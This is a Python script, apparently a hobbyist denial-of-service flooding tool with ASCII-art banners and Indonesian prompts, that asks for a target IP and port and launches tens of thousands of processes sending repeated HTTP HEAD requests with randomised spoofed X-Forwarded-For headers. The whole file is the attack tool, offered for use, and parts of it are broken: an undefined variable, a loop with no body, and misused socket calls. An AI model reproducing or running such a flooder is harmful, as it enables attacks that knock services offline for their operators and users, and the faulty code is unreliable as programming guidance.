import socket
import os, sys
from time import sleep
import multiprocessing
import random
import platform

print("""\u001b[31m
 ▄▄▄           ▄████     ███▄    █    ▒███████▒
▒████▄        ██▒ ▀█▒    ██ ▀█   █    ▒ ▒ ▒ ▄▀░
▒██  ▀█▄     ▒██░▄▄▄░   ▓██  ▀█ ██▒   ░ ▒ ▄▀▒░ 
░██▄▄▄▄██    ░▓█  ██▓   ▓██▒  ▐▌██▒     ▄▀▒   ░
 ▓█   ▓██▒   ░▒▓███▀▒   ▒██░   ▓██░   ▒███████▒
 ▒▒   ▓▒█░    ░▒   ▒    ░ ▒░   ▒ ▒    ░▒▒ ▓░▒░▒
  ▒   ▒▒ ░     ░   ░    ░ ░░   ░ ▒░   ░░▒ ▒ ░ ▒
  ░   ▒      ░ ░   ░       ░   ░ ░    ░ ░ ░ ░ ░
      ░  ░         ░             ░      ░ ░    
                                      ░        
▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████    
▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒    
▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄      
░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒   
  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒   
  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░   
    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░   
  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░     
             ░ ░      ░ ░      ░  ░      ░     
                                               \n""")
ip = input("Masukan IP: ")
port = int(input("Port: "))
url = f"http://{str(ip)}"
os.system("clear")
def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)
print("""\u001b[31m
  ██████ ▓█████  ███▄    █ ▓█████▄ 
▒██    ▒ ▓█   ▀  ██ ▀█   █ ▒██▀ ██▌
░ ▓██▄   ▒███   ▓██  ▀█ ██▒░██   █▌
  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▄   ▌
▒██████▒▒░▒████▒▒██░   ▓██░░▒████▓ 
▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒▓  ▒ 
░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░ ░ ▒  ▒ 
░  ░  ░     ░      ░   ░ ░  ░ ░  ░ 
      ░     ░  ░         ░    ░    
                            ░      """)
sleep(1)
os.system("clear")

def attack():
  data = random._urandom()
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      addr = (str(ip),int(port))
      for x in range(times):
      atk.send(data,addr)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(8000):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

def send2attack():
  for i in range(95000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts
    print (f"Attack Send To {ip} <||> {port}")
    
send2attack()
